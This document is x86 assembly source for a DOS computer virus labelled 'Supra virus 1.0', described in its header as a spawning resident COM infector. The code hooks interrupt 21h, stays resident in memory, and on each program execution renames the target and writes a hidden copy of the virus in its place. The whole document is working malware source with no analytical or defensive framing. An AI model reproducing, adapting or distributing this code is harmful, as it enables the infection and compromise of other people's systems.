   ; Supra virus 1.0
   ; ***************
   ; This is a spawning resident COM infector.

   .model tiny
   .code
   .386
   org 100h
   start:
   mov ax,3521h ; get interrupt vector 21h
   int 21h
   mov word ptr [int21_addr],bx
   mov word ptr [Int21_addr+02h],es
   mov ah,25h  ; set interrupt vector 21h
   mov dx,offset int21_vir
   int 21h
   mov dl,offset end_m+1-100h ;tsr
   int 27h ; stay resident
   int21_vir:
   cmp ah,4bh ; execute program
   jne int21_e ; not equal, jmp_exit
   infect: ; ds:dx = filename
   pusha ; save regs
   push es ds
   mov di,offset new_fn ;copy filename
   push di
   mov si,dx
   push cs
   pop es
   load_fn: ; load filename
   lodsb
   stosb
   or al,al
   jnz load_fn
   mov dword ptr es:[di],004d4f43h ; add extension COM
   mov ah,56h ; rename
   pop di
   int 21h
   jc tyta
   create: ; create new fie
   mov ah,3ch
   mov cl,0010b ;create file
   int 21h
   push cs
   pop ds
   xchg bx,ax ;filehandle
   mov ah,40h
   mov cx,offset end_v-100h ;write virii
   mov dx,100h ;code begin
   int 21h
   mov ah,3eh ;close file
   int 21h
   tyta:
   pop ds es
   mov dword ptr ds:[si],004d4f43h
   popa
   int21_e:
   db  0eah ;jump to int 21.
   end_v:
   int21_addr dd ? ; address of interrupt 21h
   new_fn  db 30 dup (?)
   end_m:
   end start
